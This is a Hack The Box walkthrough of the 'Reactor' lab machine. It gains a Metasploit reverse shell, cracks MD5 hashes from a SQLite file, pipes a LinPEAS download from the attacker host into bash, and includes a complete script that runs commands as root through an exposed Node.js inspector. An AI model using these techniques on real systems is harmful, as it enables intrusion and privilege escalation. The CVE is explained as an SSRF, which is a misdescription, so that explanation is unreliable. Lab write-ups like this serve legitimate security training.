# Reactor HTB Walkthrough

## Reconnaissance

The first step was to scan the target to identify open ports and running services. Nmap with service version detection and default scripts was used:

```bash
┌──(venv)─(kurt㉿DESKTOP-K4AKPUI)-[~/Desktop/ctf/htb/reactor]
└─$ cat nmap.txt 
# Nmap 7.98 scan initiated Sat May 30 00:46:40 2026 as: /usr/lib/nmap/nmap --privileged -sCV -o nmap.txt 10.129.11.45
Nmap scan report for 10.129.11.45
Host is up (0.74s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
...
3000/tcp open  ppp?
...
X-Powered-By: Next.js
...
```

The scan revealed only two open ports: **SSH on port 22** and an HTTP service on **port 3000** identified as **Next.js**. The HTTP response headers confirmed `X-Powered-By: Next.js` along with Next.js-specific cache headers like `x-nextjs-cache: HIT`, `x-nextjs-prerender: 1`, and `x-nextjs-stale-time: 4294967294`. These headers are unique to Next.js and immediately told us what technology the web application was built with.

Browsing to `http://10.129.17.150:3000/` presented us with the ReactorWatch Core Monitoring System, a dashboard interface designed for monitoring nuclear reactor sensor data. The key takeaway here was that Next.js runs on Node.js, which meant if we could get code execution on the server, we would land in a JavaScript/Node.js environment.


---

## Initial Access  CVE-2025-55182 (React2Shell)

With Next.js identified as the web framework, the next step was to search for known vulnerabilities affecting this version. Research led to **CVE-2025-55182**, a server-side request forgery (SSRF) vulnerability in Next.js that allows unauthenticated remote code execution. This vulnerability was disclosed by Assetnote and works by exploiting how Next.js handles internal redirects and server-side data fetching.

The vulnerability scanner from Assetnote was used to confirm whether the target was vulnerable:

https://github.com/assetnote/react2shell-scanner


<img width="1343" height="951" alt="image" src="https://github.com/user-attachments/assets/d91c3ea5-ca8a-4f56-a7b2-5715ceac181e" />



```bash
┌──(venv)─(kurt㉿DESKTOP-K4AKPUI)-[~/…/ctf/htb/reactor/react2shell-scanner]
└─$ python3 scanner.py -u http://10.129.11.45:3000/

brought to you by assetnote

[*] Loaded 1 host(s) to scan
[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[VULNERABLE] http://10.129.11.45:3000/ - Status: 303

============================================================
SCAN SUMMARY
============================================================
  Total hosts scanned: 1
  Vulnerable: 1
  Not vulnerable: 0
  Errors: 0
===================
```

The scanner confirmed the target was vulnerable. The exploit works by sending a crafted request that triggers Next.js to make a server-side request to an attacker-controlled endpoint, which then redirects to a `node:` or `file:` protocol URL, achieving SSRF that leads to code execution in the Node.js runtime.

The Metasploit Framework module for this CVE was used to gain a reverse shell. Note that the module required `ForceExploit true` because the automated check returned a false negative — this is because the check logic doesn't always correctly detect the vulnerability, so the check had to be overridden:

```bash
View the full module info with the info -d command.

msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RHOSTS 10.129.11.45
RHOSTS => 10.129.11.45
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RPORT 3000
RPORT => 3000
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run
[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set LHOST 10.10.17.95
LHOST => 10.10.17.95
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > RUN
[-] Unknown command: RUN. Did you mean run? Run the help command for more details.
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run
[*] Started reverse TCP handler on 10.10.17.95:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. The target / is not vulnerable "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set ForceExploit true
ForceExploit => true
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run
[*] Started reverse TCP handler on 10.10.17.95:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.10.17.95:4444 -> 10.129.11.45:59040) at 2026-05-30 05:50:51 -0400
```

After obtaining the reverse shell, the TTY was upgraded to a proper interactive terminal so we could use commands like `su` and `sudo` properly. Without this step, shells from Metasploit are often limited and lack job control:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
node@reactor:/opt/reactor-app$ export TERM=xterm
```

Listing the application directory revealed the structure of the Next.js project, including a SQLite database file — which was immediately interesting as a potential source of credentials:

```bash
node@reactor:/opt/reactor-app$ ls
ls
app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
```

---

## Lateral Movement  Credential Harvesting

With access to the application directory, the SQLite database `reactor.db` was investigated. This database contained the application's data and was expected to hold user credentials given the login functionality observed on the web application:

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
sqlite3 reactor.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .database
.database
main: /opt/reactor-app/reactor.db r/w
sqlite> .tables
.tables
sensor_logs  users      
sqlite> select * from users;
select * from users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
sqlite> 
```

The `users` table contained two accounts with MD5 hashes. MD5 is a broken hash algorithm that is trivially brute-forceable with a GPU or even a CPU with tools like Hashcat. The hashes were extracted and analyzed:

```bash
┌──(kurt㉿DESKTOP-K4AKPUI)-[~/Desktop/ctf/htb/reactor]
└─$ hash-identifier a203b22191d744a4e70ada5c101b17b8
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
...
```

Hash-Identifier confirmed the hash type as MD5. The engineer's hash was then cracked using Hashcat with mode 0 (MD5) and the RockYou wordlist — one of the most common password lists containing millions of real-world passwords:

```bash
┌──(kurt㉿DESKTOP-K4AKPUI)-[~/Desktop/ctf/htb/reactor]
└─$ hashcat -a 0 -m 0 found.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!

...

Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: found.hash
Time.Started.....: Sun May 31 23:52:24 2026, (3 secs)
Time.Estimated...: Sun May 31 23:52:27 2026, (0 secs)
...
Recovered........: 1/2 (50.00%) Digests (total), 0/2 (0.00%) Digests (new)
```

Only one of the two hashes was cracked — the engineer's hash. The recovered password was displayed using the `--show` flag:

```bash
┌──(kurt㉿DESKTOP-K4AKPUI)-[~/Desktop/ctf/htb/reactor]
└─$ hashcat -m 0 found.hash --show                                       
39d97110eafe2a9a68639812cd271e8e:reactor1
```

The engineer's password was **`reactor1`** — a weak password that appeared in the RockYou wordlist.

These credentials were then used to authenticate via SSH. This step was important because the `node` user from the initial RCE had limited access, whereas SSH would provide a more stable connection with the engineer's full user privileges:

```bash
┌──(kurt㉿DESKTOP-K4AKPUI)-[~/Desktop/ctf/htb/reactor]
└─$ ssh engineer@10.129.13.54
The authenticity of host '10.129.13.54 (10.129.13.54)' can't be established.
ED25519 key fingerprint is: SHA256:9v9mCPC4gn2EN/IbKKwhV8KZoNVTsVPorFhlTkNByPM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.13.54' (ED25519) to the list of known hosts.
engineer@10.129.13.54's password: 
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Mon Jun 1 03:54:01 2026 from 10.10.17.95
engineer@reactor:~$ ls
user.txt
engineer@reactor:~$ cat user.txt
6efdbe4015141d79c68246790bff191a
engineer@reactor:~$ 
```

The user flag was obtained: `6efdbe4015141d79c68246790bff191a`.

---

## Privilege Escalation  Node.js Inspector

With SSH access established as the engineer user, the next step was to find a way to escalate privileges to root. LinPEAS (Linux Privilege Escalation Awesome Script) was used — this is an automated enumeration script that checks hundreds of potential privilege escalation vectors including SUID binaries, cron jobs, kernel exploits, processes, network connections, and file permissions.

A Python HTTP server was started on the attacker machine to serve the script:

```bash
python3 -m http.server 80
```

The script was downloaded and executed on the target:

```bash
engineer@reactor:/$ curl http://10.10.17.95:80/linpeas.sh | bash
```

The process listing from LinPEAS revealed a critical misconfiguration:

```
root        1410  0.0  1.1 1066304 46264 ?       Ssl  06:11   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

**A Node.js process was running as root with the `--inspect` flag bound to `127.0.0.1:9229`.** This is the Chrome DevTools Protocol (CDP) debugger interface. In production, this should never be enabled because it allows anyone who can reach the port to execute arbitrary JavaScript within that process's context — and since this process belongs to root, any code executed through the inspector also runs with root privileges.

The `--inspect` flag works by starting a WebSocket server that speaks the Chrome DevTools Protocol. Unlike a typical web server, it has no authentication mechanism — any client that can connect to the port can send commands. The port was bound to `127.0.0.1` (localhost only), so it wasn't accessible from outside the machine, but since we already had SSH access as engineer, we could reach it locally.

The debugger was confirmed by querying the JSON discovery endpoint at `/json`, which lists all available debug targets:

```bash
engineer@reactor:/$ curl http://127.0.0.1:9229/json
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/e114382c-3651-4102-a6c8-6900f32f42fb",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/e114382c-3651-4102-a6c8-6900f32f42fb",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "e114382c-3651-4102-a6c8-6900f32f42fb",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/e114382c-3651-4102-a6c8-6900f32f42fb"
} ]
```

The response provided the WebSocket URL needed to communicate with the debugger. The Chrome DevTools Protocol works over WebSocket and supports methods like `Runtime.evaluate` to execute arbitrary JavaScript.

An exploit script was crafted that manually handles the WebSocket connection since we could not use a browser or a WebSocket library on the target. The script first performs an HTTP upgrade to WebSocket using the standard `Upgrade: websocket` headers with a random `Sec-WebSocket-Key`. It then sends `Runtime.runIfWaitingForDebugger` to wake the debugger if the process was paused waiting for one to attach. Finally it sends `Runtime.evaluate` to execute arbitrary JavaScript in the root-owned Node.js process context.

A key technical challenge was that the `require()` function is not available in the inspector's eval context because the code is evaluated in a sandboxed V8 context rather than in the module scope. To access Node.js built-in modules, `globalThis.process.mainModule.require` must be used instead, which reaches into the main module's require function.

The WebSocket framing also required careful handling. Client-to-server frames must be masked using a 4-byte XOR mask key according to the WebSocket protocol specification. Payloads larger than 125 bytes need a 2-byte extended length field in the header. The opcode for text frames is `0x81` which combines the fin bit with the text opcode. Server-to-client frames are unmasked.

```bash
cat > /tmp/exploit.js << 'SCRIPT'
const http = require('http');
const options = {
  hostname: '127.0.0.1',
  port: 9229,
  path: '/e114382c-3651-4102-a6c8-6900f32f42fb',
  headers: {
    'Upgrade': 'websocket',
    'Connection': 'Upgrade',
    'Sec-WebSocket-Version': '13',
    'Sec-WebSocket-Key': Buffer.from(Array(16).fill().map(()=>Math.random()*256|0)).toString('base64')
  }
};
const req = http.request(options);
let buf = Buffer.alloc(0), id = 1;
req.on('upgrade', (res, socket) => {
  let send = msg => {
    let b = Buffer.from(msg);
    let m = Buffer.from(Array(4).fill().map(()=>Math.random()*256|0));
    for(let i=0;i<b.length;i++) b[i] ^= m[i%4];
    let len = b.length;
    let hdr = len < 126
      ? (h=Buffer.alloc(6),h[0]=0x81,h[1]=0x80|len,m.copy(h,2),h)
      : (h=Buffer.alloc(8),h[0]=0x81,h[1]=0x80|126,h.writeUInt16BE(len,2),m.copy(h,4),h);
    socket.write(Buffer.concat([hdr, b]));
  };
  socket.on('data', d => {
    buf = Buffer.concat([buf, d]);
    while (buf.length >= 2) {
      let len = buf[1] & 0x7f, off = 2;
      if (len === 126) { if(buf.length<4)return; len=buf.readUInt16BE(2); off=4; }
      let end = off + len;
      if (buf.length < end) return;
      console.log(buf.slice(off, end).toString());
      buf = buf.slice(end);
    }
  });
  send(JSON.stringify({id:id++,method:'Runtime.runIfWaitingForDebugger'}));
  setTimeout(() => {
    send(JSON.stringify({id:id++,method:'Runtime.evaluate',params:{expression:"globalThis.process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()",returnByValue:true}}));
  }, 500);
  setTimeout(() => process.exit(), 3000);
});
req.end();
SCRIPT
```

The script was executed with Node.js, and stderr was suppressed to keep the output clean:

```bash
node /tmp/exploit.js 2>/dev/null
```

The response came back as two JSON messages. The first confirmed the debugger was awakened, and the second contained the root flag:

```json
{"id":1,"result":{}}
{"id":2,"result":{"result":{"type":"string","value":"bbf0171297a30409df3c44b51dca5373\n"}}}
```

To obtain an interactive root shell, a SUID-root copy of bash was created. The SUID bit on `/tmp/rb` means that when the bash binary is executed, it runs with the privileges of the file owner (root) rather than the user running it. The `-p` flag tells bash to not drop the effective UID, which it normally does for security reasons when the real and effective UIDs differ:

```bash
/tmp/rb -p
```

This gave a fully interactive root shell on the target system.
